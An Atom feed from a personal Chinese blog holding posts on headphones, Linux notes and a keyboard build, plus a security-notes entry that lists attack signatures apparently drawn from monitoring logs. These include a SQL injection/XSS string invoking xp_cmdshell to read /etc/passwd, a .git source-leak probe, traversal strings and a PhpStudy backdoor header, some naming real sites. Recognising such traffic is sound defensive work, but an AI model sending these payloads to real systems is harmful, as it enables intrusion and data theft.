<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>烏巢</title>
  <icon>https://hejueyun.github.io/icon.png</icon>
  <subtitle>A Self-taught Idiot 🖊</subtitle>
  <link href="https://hejueyun.github.io/atom.xml" rel="self"/>
  
  <link href="https://hejueyun.github.io/"/>
  <updated>2021-06-17T15:54:43.990Z</updated>
  <id>https://hejueyun.github.io/</id>
  
  <author>
    <name>何决云</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>外设-hifi小烧闲谈</title>
    <link href="https://hejueyun.github.io/posts/a78f415f/"/>
    <id>https://hejueyun.github.io/posts/a78f415f/</id>
    <published>2021-06-15T07:34:51.000Z</published>
    <updated>2021-06-17T15:54:43.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>闲来无事，记录一下目前烧hifi(?)的经历。</p><p>起因的话</p><ul><li>（主要）看动漫的姿势水平提高了(?)，有了需求</li><li>看了gigguk对ost重要性的科普</li><li>（客观）从WEB党转为了下载党，声音的差别被放大了</li><li>单纯拜物教/数码宅/消费欲/…</li></ul><p>其实之前对音乐这块一直是敬而远之的，毕竟音痴，而且音乐也完全不懂鉴赏的技巧。</p><p>然后入门的话主要参考了<a href>鬼斧神工119</a>和<a href="https://www.zhihu.com/people/lprsyofcivtr">lprsyofCIvTR</a>，其实也主要和选购和设备调试之类相关，<br>像什么听音观啊音乐史啊还是完全无知。</p><p>另外本文只是<strong>hifi</strong>杂谈，所以用过的游戏耳机就不会入列了。</p><h2 id="耳机"><a href="#耳机" class="headerlink" title="耳机"></a>耳机</h2><h3 id="选购"><a href="#选购" class="headerlink" title="选购"></a>选购</h3><p>只谈本人用过的耳机</p><h4 id="SHP9500"><a href="#SHP9500" class="headerlink" title="SHP9500"></a>SHP9500</h4><p><em>一款被吹烂了的耳机</em></p><center><img src="/posts/a78f415f/shp9500.jpg" width="250"></center><table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>音质好</td><td>重量：300+g</td></tr><tr><td>便宜</td><td>耳罩特别大，带起来漏音严重</td></tr><tr><td>不夹头，有眼镜也无所谓</td><td>大且不可折叠，不方便携带</td></tr><tr><td>可以通过EQ修正来提高音质</td><td>低音不足</td></tr><tr><td>政治正确？</td><td>夏天带着热</td></tr></tbody></table><p>SHP9500算是我的hifi入门，当时觉得花400大洋买个耳机真是脑子进水了，但现在觉得才花400就想买个hifi耳机简直脑子进水了…Anyway这个耳机陪伴了我相当一段时间，直到我实在受不了他的重量和漏音…300g的耳机带久了脖子真的会疼。</p><h4 id="Bose-qc35II"><a href="#Bose-qc35II" class="headerlink" title="Bose qc35II"></a>Bose qc35II</h4><p><em>又一款被吹烂了的（非hifi）耳机</em></p><center><img src="/posts/a78f415f/bose.jpg" width="250"></center><p>qc35ii算不上hifi耳机，但算是弥补了我出行需要的耳机：编写折叠+超清重量+蓝牙降噪。其实现在在体验过降噪豆后，其实有点后悔没考虑降噪入耳式，牺牲一点降噪来换取超级轻+便携。对qc35ii的不满还在于比较一般的交互设计，感觉每次打开都要听一次提示音，而且只能存两台设备，而且貌似不能同时设备混响。音质的话倒没有评测说的那么一般，可能定位上就没把他当hifi吧。</p><p>另外，虽然是封闭式耳机，但带着不算太热，比哪些开放式好到不知道哪里去了。</p><h4 id="dt990pro"><a href="#dt990pro" class="headerlink" title="dt990pro"></a>dt990pro</h4><p><em>被“天鹅绒”耳罩骗进坑结果发现不是想象那样…</em></p><center><img src="/posts/a78f415f/dt990pro.jpg" width="250"></center><p>以shp9500作为对比坐标轴：</p><ul><li>轻：240g vs 300g</li><li>音质：“一耳朵”提升</li><li>舒适度：比9500夹头很多，但天鹅肉耳罩加更舒适的头梁垫，总体而言还是更优</li></ul><p>缺点：</p><ul><li>贵，标价1300（本人是海购亚马逊黑五750拿下的( •̀ ω •́ )✧）</li><li>热：夏天空调房还是会捂出汗的</li><li>夹头：戴眼镜确实没那么舒服，并且戴久了只是耳罩会变形，夹头仍没有缓解</li><li>不那么适合打游戏？感觉游戏听音辨位不是很好？但其实我觉得还行</li></ul><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><ul><li>软件：Equalizer APO</li><li>参考EQ哈曼曲线：<a href="https://www.zhihu.com/people/lprsyofcivtr">index/list_of_presets - oratory1990</a><ul><li>找对应的耳机以及其新旧程度</li><li>然后把给出的eq方案导出为txt文件</li><li>再用Equalizer APO再入</li></ul></li><li>效果<ul><li>SHP9500有非常非常大的提升（俗称一耳朵？），但dt990pro就没啥区别，或者不强求的话可以忽略不计。(有点像机械键盘润轴的道理：只有便宜货（两块钱以下的轴）才有润的必要)</li></ul></li></ul><h2 id="hifi播放器-mp3"><a href="#hifi播放器-mp3" class="headerlink" title="hifi播放器(mp3)"></a>hifi播放器(mp3)</h2><h3 id="filo-m7"><a href="#filo-m7" class="headerlink" title="filo m7"></a>filo m7</h3><center><img src="/posts/a78f415f/fiio.jpg" width="250"></center><p>TRASH…本来也没希望他音质有多好，当初还去查了查他的解码芯片的型号，感觉也还凑合，没想到还不如我的小新pro14…而且问题也挺多的，什么屏幕坏线（后面自己好了也挺神奇的），按键失灵，总之不推荐（都停产了话说）。只能说也就值我咸鱼二手淘到这货的价格吧…</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本着“不要求讲究，但愿不将就”的原则，最终通过dt990pro毕业hifi。这圈小烧下来听动漫ost的姿势确实提高了不少，看动画的体验up。另外也零零碎碎接触了点欧美的布鲁斯和摇滚，感觉也算是告别白痴级别了吧..?</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;闲来无事，记录一下目前烧hifi(?)的经历。&lt;/p&gt;
&lt;p&gt;起因的话&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（主要）看动漫的姿势水平提高了(?)，有了需求&lt;/li&gt;
&lt;li&gt;看了gigguk对ost重要性的科普&lt;/li&gt;
&lt;li&gt;（客观）从WEB党转为了下载党，声音的差别被放大了&lt;/li&gt;
&lt;li&gt;单纯拜物教/数码宅/消费欲/…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实之前对音乐这块一直是敬而远之的，毕竟音痴，而且音乐也完全不懂鉴赏的技巧。&lt;/p&gt;
&lt;p&gt;然后入门的话主要参考了&lt;a href&gt;鬼斧神工119&lt;/a&gt;和&lt;a href=&quot;https://www.zhihu.com/people/lprsyofcivtr&quot;&gt;lprsyofCIvTR&lt;/a&gt;，其实也主要和选购和设备调试之类相关，&lt;br&gt;像什么听音观啊音乐史啊还是完全无知。&lt;/p&gt;
&lt;p&gt;另外本文只是&lt;strong&gt;hifi&lt;/strong&gt;杂谈，所以用过的游戏耳机就不会入列了。&lt;/p&gt;
&lt;h2 id=&quot;耳机&quot;&gt;&lt;a href=&quot;#耳机&quot; class=&quot;headerlink&quot; title=&quot;耳机&quot;&gt;&lt;/a&gt;耳机&lt;/h2&gt;&lt;h3 id=&quot;选购&quot;&gt;&lt;a href=&quot;#选购&quot; class=&quot;headerlink&quot; title=&quot;选购&quot;&gt;&lt;/a&gt;选购&lt;/h3&gt;&lt;p&gt;只谈本人用过的耳机&lt;/p&gt;</summary>
    
    
    
    <category term="雜玩" scheme="https://hejueyun.github.io/categories/funfair/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>linux笔记</title>
    <link href="https://hejueyun.github.io/posts/638d4d8a/"/>
    <id>https://hejueyun.github.io/posts/638d4d8a/</id>
    <published>2021-06-11T11:49:10.000Z</published>
    <updated>2021-06-14T12:25:24.220Z</updated>
    
    <content type="html"><![CDATA[<p><em>鸟哥的Linux私房菜笔记</em></p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h3 id="字符编码系统"><a href="#字符编码系统" class="headerlink" title="字符编码系统"></a>字符编码系统</h3><ul><li>ASCII：1字节，只用于英文</li><li>Unicode：UTF-8</li></ul><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>操作系统=内核+系统调用</strong></p><p>内核层(kernel)</p><ul><li><strong>管理硬件的程序</strong><ul><li>如果你的内核不支持网络协议，那么就算你的电脑有网卡也无济于事</li></ul></li><li>内核程序放置于内存中的<strong>受保护区域</strong>(?)</li><li>内核程序是守护程序</li></ul><p>系统调用层(system call)</p><ul><li>提供API调用内核</li><li>应用程序的开发都是参考操作系统提供的API，所以该应用程序只能在该系统上运行</li></ul><p>封装：<strong>硬件→（内核→系统调用）→应用程序(壳程序)</strong></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h3><p>磁盘设备文件名格式：<code>/dev/sd[a-p]</code></p><ul><li>按Linux内核检测顺序</li><li>e.g. <code>USB磁盘：/dev/sdc</code></li></ul><p>磁盘分区</p><blockquote><p>磁盘分区是使用分区编辑器（partition editor）在磁盘上划分几个逻辑部分，盘片一旦划分成数个分区（Partition），不同类的目录与文件可以存储进不同的分区。</p></blockquote><table><thead><tr><th>MBR</th><th>GPT</th></tr></thead><tbody><tr><td>Master Boot Record</td><td>Globally Unique Identifier Partition Table</td></tr><tr><td>主引导记录</td><td>全局唯一标识分区表</td></tr><tr><td>可以安装启动程序的地方</td><td>B3</td></tr><tr><td>MBR仅有一个区块，容错低</td><td>-</td></tr><tr><td>MBR内存放启动引导程序的区块只有446bytes,可能会不够用</td><td>-</td></tr></tbody></table><blockquote><p>GPT和MBR对普通用户而言最主要的两个区别</p><ul><li>GPT支持单分区容量超过2T</li><li>GPT支持快速启动</li></ul></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;鸟哥的Linux私房菜笔记&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;h3 id=&quot;字符编码系统&quot;&gt;&lt;a href=&quot;#字符编码系统&quot; class=&quot;headerlink&quot; title=&quot;字符编码系统&quot;&gt;&lt;/a&gt;字符编码系统&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ASCII：1字节，只用于英文&lt;/li&gt;
&lt;li&gt;Unicode：UTF-8&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;操作系统&quot;&gt;&lt;a href=&quot;#操作系统&quot; class=&quot;headerlink&quot; title=&quot;操作系统&quot;&gt;&lt;/a&gt;操作系统&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;操作系统=内核+系统调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内核层(kernel)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;管理硬件的程序&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;如果你的内核不支持网络协议，那么就算你的电脑有网卡也无济于事&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内核程序放置于内存中的&lt;strong&gt;受保护区域&lt;/strong&gt;(?)&lt;/li&gt;
&lt;li&gt;内核程序是守护程序&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;系统调用层(system call)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供API调用内核&lt;/li&gt;
&lt;li&gt;应用程序的开发都是参考操作系统提供的API，所以该应用程序只能在该系统上运行&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Operating System" scheme="https://hejueyun.github.io/categories/Operating-System/"/>
    
    <category term="Linux" scheme="https://hejueyun.github.io/categories/Operating-System/Linux/"/>
    
    <category term="Basic" scheme="https://hejueyun.github.io/categories/Operating-System/Linux/Basic/"/>
    
    
    <category term="Notes" scheme="https://hejueyun.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>[外设]Cheap 60键盘组装记录</title>
    <link href="https://hejueyun.github.io/posts/7a6bc0ab/"/>
    <id>https://hejueyun.github.io/posts/7a6bc0ab/</id>
    <published>2021-06-01T15:54:50.000Z</published>
    <updated>2021-06-07T16:42:23.169Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>购买这个套件纯属偶然，就是突然兴起逛了一下装备前线，然后就到了cheap60套件，看着产品图感觉符合审美要求，而且用的gasket结构要比在用的托盘要好——虽然我当时完全不知道gasket是啥。</p><p>cheap60给我提供了一个廉价的双模键盘方案。同时，考虑到以前已经用过左移64，想体验一下新的布局。标准60左右较为对称，感觉观感会不错。最重要的是，之前ttc静音茶没能让我完全满意，借这次机会要实现终极静音。</p><h3 id="tray-mount-vs-gasket-mount"><a href="#tray-mount-vs-gasket-mount" class="headerlink" title="tray mount vs gasket mount"></a><code>tray mount</code> vs <code>gasket mount</code></h3><p>tray mount托盘结构</p><blockquote><p>键盘外壳的底板有螺钉孔，螺丝贯穿定位板和PCB固定整个键盘。 PCB和定位板以及外壳需要share相同的螺丝位从而拼到一起。</p></blockquote><ul><li>优点<ul><li>结构简单</li><li>安装方便</li></ul></li><li>缺点<ul><li>手感一致性差，尤其是四个角可能空腔音比较大</li></ul></li></ul><center><img src="/posts/7a6bc0ab/1.jpg" width="350"></center><p>Gasket mount垫片结构</p><blockquote><p>螺丝只串起外壳，内胆没有刚性结构和螺丝支撑，全靠橡胶和上下盖精度压死在键盘中间。</p></blockquote><ul><li>优点<ul><li>手感一致性非常好<blockquote><p>手感会非常非常非常非常均匀，而且由于橡胶条固定，所以上下两个垂直方向都会有缓冲，从而提供更温润的手感。</p></blockquote></li></ul></li></ul><center><img src="/posts/7a6bc0ab/2.jpg" width="350"></center><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><h3 id="成本list"><a href="#成本list" class="headerlink" title="成本list"></a>成本list</h3><table><thead><tr><th>Item</th><th>Price</th></tr></thead><tbody><tr><td>Cheap60套件（61）</td><td>150</td></tr><tr><td>捕获者极简白键帽</td><td>155</td></tr><tr><td>高特静音白轴 x 110</td><td>85</td></tr><tr><td>静音胶圈+润轴套件</td><td>83</td></tr><tr><td>PCB GT-BLE60 rev.F</td><td>270</td></tr><tr><td>1500mAh 电池</td><td>20</td></tr><tr><td><strong>总计</strong></td><td><strong>763</strong></td></tr></tbody></table><h3 id="套件list"><a href="#套件list" class="headerlink" title="套件list"></a>套件list</h3><center><img src="/posts/7a6bc0ab/3.jpg" height="250px"></center><table><thead><tr><th>套件主要组成</th></tr></thead><tbody><tr><td>亚克力上中下框</td></tr><tr><td>定位板</td></tr><tr><td>底板与电池仓</td></tr><tr><td>poron垫片</td></tr><tr><td>夹心棉、底棉、电池仓棉、轴下垫</td></tr><tr><td>脚撑</td></tr><tr><td>ainy圣雄猫卫星轴</td></tr><tr><td>铜柱&amp;&amp;螺丝</td></tr></tbody></table><h2 id="组装"><a href="#组装" class="headerlink" title="组装"></a>组装</h2><p><em>组装的具体教程b站有视频，这里就按照本人组装的顺序粗略记录。</em></p><h3 id="组装脚撑"><a href="#组装脚撑" class="headerlink" title="组装脚撑"></a>组装脚撑</h3><center><img src="/posts/7a6bc0ab/4.jpg" width="350"></center><h3 id="组装电池仓，再将脚撑与底板连接"><a href="#组装电池仓，再将脚撑与底板连接" class="headerlink" title="组装电池仓，再将脚撑与底板连接"></a>组装电池仓，再将脚撑与底板连接</h3><center><img src="/posts/7a6bc0ab/5.jpg" width="350"></center><h3 id="调教并组装卫星轴"><a href="#调教并组装卫星轴" class="headerlink" title="调教并组装卫星轴"></a>调教并组装卫星轴</h3><center><img src="/posts/7a6bc0ab/6.jpg" width="350"></center><p>卫星轴调教：是必须要润的，未润的轴直接装上然后晃动定位板可以听见相当明显的零件碰撞的声音…润了之后就没有了</p><ul><li>（可选）剪假轴，个人比较剪脚前后没有区别。剪的脚是小脚和斜对面的大脚</li><li>润轴心</li><li>润轴壳</li><li>润钢丝<ul><li>注意要润陷进卡扣的一侧侧面（也就是和卡口接触的面）</li></ul></li><li>组装：组装轴心和轴壳，注意别装反（轴心能上下运动才对），再把钢丝插入轴心底座，然后卡进卡扣</li></ul><h3 id="润轴、上轴和键帽"><a href="#润轴、上轴和键帽" class="headerlink" title="润轴、上轴和键帽"></a>润轴、上轴和键帽</h3><center><img src="/posts/7a6bc0ab/7.jpg" width="350"></center><ul><li>润轴的方法略</li><li>说一下开轴的方法，主要是用开轴器抵住卡扣的两个角，而不是抵住两条直边</li><li><em>话说捕获者这套键帽真是便宜又好</em></li><li><em>有话说其实静音胶圈的效果聊胜于无？</em></li></ul><h3 id="贴poron垫片，组装中、上框"><a href="#贴poron垫片，组装中、上框" class="headerlink" title="贴poron垫片，组装中、上框"></a>贴poron垫片，组装中、上框</h3><center><img src="/posts/7a6bc0ab/8.jpg" width="550"></center><hr><center><img src="/posts/7a6bc0ab/9.jpg" width="550"></center><h3 id="软件设置键位"><a href="#软件设置键位" class="headerlink" title="软件设置键位"></a>软件设置键位</h3><p>虽然之前对国产软件有阴影，但这次可以说是相当好用了。</p><center><img src="/posts/7a6bc0ab/10.png" width="450"></center><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的cheap60在某种意义上可以算是毕业键盘了，基本满足我现阶段的需求，毕竟也没有什么可以挑剔的地方——如果硬要说的话，就是不敢摔？毕竟亚克力，感觉在坚固性上确实略有隐患。打游戏的话，感觉上是略不如同价位的成品cherry红轴键盘？（对比的是阿米洛），感觉在有线模式下还是有点反应延迟；还有就是没有蓝牙的物理开关比较可惜——不过这些得怪pcb的firmware(?)支持不足，怪不得套件本身。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/133532919">聊聊机械键盘的结构。 - 知乎</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;购买这个套件纯属偶然，就是突然兴起逛了一下装备前线，然后就到了cheap60套件，看着产品图感觉符合审美要求，而且用的gasket结构要比在用的托盘要好——虽然我当时完全不知道gasket是啥。&lt;/p&gt;
&lt;p&gt;cheap60给我提供了一个廉价的双模键盘方案。同时，考虑到以前已经用过左移64，想体验一下新的布局。标准60左右较为对称，感觉观感会不错。最重要的是，之前ttc静音茶没能让我完全满意，借这次机会要实现终极静音。&lt;/p&gt;
&lt;h3 id=&quot;tray-mount-vs-gasket-mount&quot;&gt;&lt;a href=&quot;#tray-mount-vs-gasket-mount&quot; class=&quot;headerlink&quot; title=&quot;tray mount vs gasket mount&quot;&gt;&lt;/a&gt;&lt;code&gt;tray mount&lt;/code&gt; vs &lt;code&gt;gasket mount&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;tray mount托盘结构&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;键盘外壳的底板有螺钉孔，螺丝贯穿定位板和PCB固定整个键盘。 PCB和定位板以及外壳需要share相同的螺丝位从而拼到一起。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;优点&lt;ul&gt;
&lt;li&gt;结构简单&lt;/li&gt;
&lt;li&gt;安装方便&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点&lt;ul&gt;
&lt;li&gt;手感一致性差，尤其是四个角可能空腔音比较大&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;center&gt;&lt;img src=&quot;/posts/7a6bc0ab/1.jpg&quot; width=&quot;350&quot;&gt;&lt;/center&gt;

&lt;p&gt;Gasket mount垫片结构&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;螺丝只串起外壳，内胆没有刚性结构和螺丝支撑，全靠橡胶和上下盖精度压死在键盘中间。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="雜玩" scheme="https://hejueyun.github.io/categories/funfair/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>安全改进: 从零实现简单数据库系统</title>
    <link href="https://hejueyun.github.io/posts/517c6f17/"/>
    <id>https://hejueyun.github.io/posts/517c6f17/</id>
    <published>2021-05-12T05:26:56.000Z</published>
    <updated>2021-06-07T16:33:25.829Z</updated>
    
    
    
    
    <category term="雜文" scheme="https://hejueyun.github.io/categories/essay/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>[外设]Mojo60 Christian</title>
    <link href="https://hejueyun.github.io/posts/3f940e6c/"/>
    <id>https://hejueyun.github.io/posts/3f940e6c/</id>
    <published>2021-04-27T06:42:22.000Z</published>
    <updated>2021-06-01T16:06:23.251Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 这可能出现在手机端上.">  <script id="hbeData" type="hbeData" data-hmacdigest="68f05dac7561549ce995c99f56bb17c4438885cb3c25330e5351d2134a9b2c0e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">由于某不可抗因素，查看本文章需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">&lt;div class=&quot;hbe hbe-container&quot; id=&quot;hexo-blog-encrypt&quot; data-wpm=&quot;抱歉, 这个密码看着不太对, 请再试试.&quot; data-whm=&quot;抱歉, 这个文章不能被校验, 这可能出现在手机端上.&quot;&gt;
  &lt;script id=&quot;hbeData&quot; type=&quot;hbeData&quot; data-hmacdigest=&quot;68f05dac7561549ce995c99f56bb17c4438885cb3c25330e5351d2134a9b2c0e&quot;&gt;&lt;/script&gt;
  &lt;div class=&quot;hbe hbe-content&quot;&gt;
    &lt;div class=&quot;hbe hbe-input hbe-input-default&quot;&gt;
      &lt;input class=&quot;hbe hbe-input-field hbe-input-field-default&quot; type=&quot;password&quot; id=&quot;hbePass&quot;&gt;
      &lt;label class=&quot;hbe hbe-input-label hbe-input-label-default&quot; for=&quot;hbePass&quot;&gt;
        &lt;span class=&quot;hbe hbe-input-label-content hbe-input-label-content-default&quot;&gt;由于某不可抗因素，查看本文章需要密码.&lt;/span&gt;
      &lt;/label&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&quot;/lib/hbe.js&quot;&gt;&lt;/script&gt;&lt;link href=&quot;/css/hbe.style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</summary>
    
    
    
    <category term="雜玩" scheme="https://hejueyun.github.io/categories/funfair/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>信安小知识-6</title>
    <link href="https://hejueyun.github.io/posts/f11654a/"/>
    <id>https://hejueyun.github.io/posts/f11654a/</id>
    <published>2021-04-25T07:09:09.356Z</published>
    <updated>2021-04-25T07:09:09.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Sqlmap-space2blank-Tamper-特殊空字符"><a href="#Sqlmap-space2blank-Tamper-特殊空字符" class="headerlink" title="Sqlmap space2blank Tamper(特殊空字符)"></a>Sqlmap space2blank Tamper(特殊空字符)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: https:&#x2F;&#x2F;www.mct.gov.cn&#x2F;this_is_404_page?waf_detect&#x3D;value+AND+1&#x3D;1+UNION+ALL+SELECT+1,NULL,&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;&#39;,table_name+FROM+information_schema.tables+WHERE+2&gt;1--&#x2F;**&#x2F;;+EXEC+xp_cmdshell(&#39;cat+..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#39;)#\</span><br></pre></td></tr></table></figure><h2 id="GIT项目源代码探测"><a href="#GIT项目源代码探测" class="headerlink" title="GIT项目源代码探测"></a>GIT项目源代码探测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.caeg.cn&#x2F;.git&#x2F;HEAD</span><br></pre></td></tr></table></figure><h2 id="目录穿越攻击行为"><a href="#目录穿越攻击行为" class="headerlink" title="目录穿越攻击行为"></a>目录穿越攻击行为</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">temp&#x3D;&#x2F;..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows&#x2F;</span><br><span class="line">.shtml&#x2F;..&#x2F;..&#x2F;xhtml&#x2F;css&#x2F;index.css</span><br><span class="line"></span><br><span class="line">[%2F  &#x3D;&#x3D;  &#x2F;]</span><br></pre></td></tr></table></figure><h2 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;nice ports,&#x2F;Trinity.txt.bak</span><br></pre></td></tr></table></figure><h2 id="PhpStudy后门远程命令执行"><a href="#PhpStudy后门远程命令执行" class="headerlink" title="PhpStudy后门远程命令执行"></a>PhpStudy后门远程命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset: ZGllKG1kNSgnSGVsbG9waHBTdHVkeScpKTs&#x3D;</span><br><span class="line"></span><br><span class="line">die(md5(&#39;HellophpStudy&#39;));</span><br></pre></td></tr></table></figure><h2 id="Whatweb扫描行为"><a href="#Whatweb扫描行为" class="headerlink" title="Whatweb扫描行为"></a>Whatweb扫描行为</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: WhatWeb&#x2F;0.5.2</span><br></pre></td></tr></table></figure><h2 id="系统-服务配置不当"><a href="#系统-服务配置不当" class="headerlink" title="系统/服务配置不当"></a>系统/服务配置不当</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、如果必须开启该目录的目录列表功能，则应对该目录下的文件进行详细检查，确保不包含敏感文件。2、如非必要，请重新配置WEB服务器，禁止该目录的自动目录列表功能。附：1.Apache禁止列目录：方法一，修改httpd.conf配置文件，查找OptionsIndexesFollowSymLinks，修改为Options-Indexes；方法二，在www目录下的修改.htaccess配置文件，加入Options-Indexes。（推荐）2.Tomcat禁止列目录：在Tomcat的conf&#x2F;web.xml文件里把listings值改为false。PS：修改完httpd.conf后，一定记得重启web服务，才能生效噢！1.IIS禁止列目录方法一，在网站目录上右键点“属性”然后找到“主目录”，将“目录浏览”前的勾去掉即可，如下图方法二，若要启用或禁用目录浏览，请使用下面的语法：appcmdsetconfig&#x2F;section:directoryBrowse&#x2F;enabled:true|false默认情况下，enabled属性设置为true，这表示目录浏览已启用。将enabled属性设置为false时，就会禁用目录浏览。例如，若要禁用目录浏览，请在命令提示符处键入如下命令，然后按Enter：appcmdsetconfig&#x2F;section:directoryBrowse&#x2F;enabled:false</span><br></pre></td></tr></table></figure><h2 id="Apache-Shiro-lt-1-2-4反序列化漏洞攻击-CVE-2016-4437"><a href="#Apache-Shiro-lt-1-2-4反序列化漏洞攻击-CVE-2016-4437" class="headerlink" title="Apache Shiro &lt;= 1.2.4反序列化漏洞攻击(CVE-2016-4437)"></a>Apache Shiro &lt;= 1.2.4反序列化漏洞攻击(CVE-2016-4437)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常情况下，远程代码执行漏洞包括： （1）URL提交，主要是GET、POST请求； （2）构造特定的HTTP请求； （3）利用一些框架底层的安全漏洞，执行任意代码； 远程代码执行漏洞可带来如下危害： （1）攻击者可通过此漏洞创建恶意脚本文件，对服务器的正常运行造成安全威胁； （2）黑客可在服务器上执行任意脚本命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</span><br></pre></td></tr></table></figure><h2 id="WebServer文件解析漏洞攻击"><a href="#WebServer文件解析漏洞攻击" class="headerlink" title="WebServer文件解析漏洞攻击"></a>WebServer文件解析漏洞攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebServer在处理请求中asp扩展名时，通过上传asp代码的图片文件访问xxx.asp;x.jpg来执行其中的代码;</span><br></pre></td></tr></table></figure><h2 id="信息泄露攻击"><a href="#信息泄露攻击" class="headerlink" title="信息泄露攻击"></a>信息泄露攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 